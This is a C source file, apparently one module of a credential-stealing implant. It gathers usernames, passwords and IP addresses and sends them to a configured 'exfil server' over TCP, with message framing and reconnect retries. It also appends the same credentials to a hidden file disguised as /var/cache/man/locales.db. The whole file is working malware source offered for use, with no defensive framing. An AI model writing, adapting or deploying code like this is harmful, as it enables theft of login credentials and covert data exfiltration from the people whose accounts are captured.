#include "exfil.h"
#include "config.h"

#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/stat.h>

#ifndef SERVER_HOST
#error "ERROR: Missing server IP address"
#endif

#ifndef SERVER_PORT
#error "ERROR: Missing server port number"
#endif

#define MAX_RETRIES 5
#define MAX_MESSAGE_LEN 500 // 500 bytes

struct serv_info server = {SERVER_HOST, SERVER_PORT};

int server_connect() {
    /* Attempt to establish a connection to the exfil server and return an active socket, or -1 on failure */

    struct sockaddr_in address = {0};
    struct timeval timeout = {5, 0};

    int server_sock = socket(AF_INET, SOCK_STREAM, 0);

    address.sin_family = AF_INET;
    address.sin_port = htons(server.port);

    int result = inet_pton(AF_INET, server.host, &address.sin_addr);
    if (result == -1) {
        perror("inet_pton");
        close(server_sock);
        return -1;
    }
    if (result == 0) {
        close(server_sock);
        return -1;
    }

    // Set receive timeout to prevent the program from hanging due to bad recv() calls
    if (setsockopt(server_sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) == -1) {
        perror("setsockopt");
        return -1;
    }

    result = connect(server_sock, (struct sockaddr *) &address, sizeof address);
    if (result == -1) {
        if (errno == ETIMEDOUT) {
            // Server down, nonexistent, or firewall blocking packets
        } else if (errno == ENETUNREACH) {
            // Internet connection likely down
        }
    }

    return server_sock;
}

ssize_t send_all(int socket_fd, const void *data, uint32_t len) {
    /* This function ensures every byte in the data buffer was submitted to the kernel for transmission. The kernel's
     * buffer can fill up sometimes, so we compare how many bytes send() actually submitted against the total size of the
     * data, and keep calling send for any remaining bytes.
     */
    size_t bytes_sent = 0;
    const unsigned char *bytes = data;

    while (bytes_sent < len) {
        ssize_t n = send(socket_fd, bytes + bytes_sent, len - bytes_sent, MSG_NOSIGNAL);
        if (n == -1) {
            if (errno == EINTR) {
                continue;
            }
            return -1;
        }
        bytes_sent += n;
    }
    return (ssize_t) bytes_sent;
}

ssize_t recv_all(int socket_fd, void *buf, size_t len) {
    /* Similar to send_all() but for receiving data */

    size_t bytes_recvd = 0;
    unsigned char *buffer = buf;

    while (bytes_recvd < len) {
        ssize_t n = recv(socket_fd, buffer + bytes_recvd, len - bytes_recvd, MSG_WAITALL);
        if (n == -1) {
            if (errno == EINTR) {
                continue;
            }
            return -1;
        }
        if (n == 0) {
            return (ssize_t) bytes_recvd;
        }
        bytes_recvd += n;
    }

    return (ssize_t) bytes_recvd;
}

int send_message(int socket_fd, const void *data, size_t len) {
    /* This function implements message framing by sending the total size of the data payload as an unsigned integer
     * BEFORE sending the actual data. This is to ensure that the data was sent in its entirety.
     */
    if (len > MAX_MESSAGE_LEN) {
        return -1;
    }

    uint32_t length = htonl(len);
    ssize_t result = send_all(socket_fd, &length, sizeof(uint32_t));
    if (result == -1) {
        return -1;
    }

    result = send_all(socket_fd, data, len);
    if (result == -1) {
        return -1;
    }

    return 0;
}

int remote_exfil(const struct user *user) {
    char data[MAX_MESSAGE_LEN];
    int retries = 0;
    int ack_result;

    int server_fd = server_connect();
    if (server_fd == -1) {
        return -1;
    }

    snprintf(data, sizeof data, "%s|%s|%s|%s", user->server_ip, user->client_ip, user->username, user->password);
    while (1) {
        int result = send_message(server_fd, data, strlen(data));
        if (result == -1) {
            if (errno == EPIPE || errno == ECONNRESET) {
                // Connection lost. Attempt to reconnect unless MAX_RETRIES exceeded
                if (retries++ >= MAX_RETRIES) {
                    close(server_fd);
                    return -1;
                }
                close(server_fd);
                server_fd = server_connect();
                continue;
            }
            return -1;
        }
        ssize_t result2 = recv_all(server_fd, &ack_result, sizeof ack_result);
        if (result2 == -1) {
            return -1;
        }
        if (ack_result != 1) {
            return 1;
        }
        break;
    }

    return 0;
}

int local_exfil(const struct user *user) {
    // Current implementation is to write to a file on disk in an obscure path
    char data[MAX_MESSAGE_LEN];
    snprintf(data, sizeof data, "%s|%s|%s|%s", user->client_ip, user->server_ip, user->username, user->password);

    FILE *fp = fopen("/var/cache/man/locales.db", "a");
    if (!fp) {
        // perror("fopen");
        return -1;
    }
    fputs(data, fp);
    return 0;
}
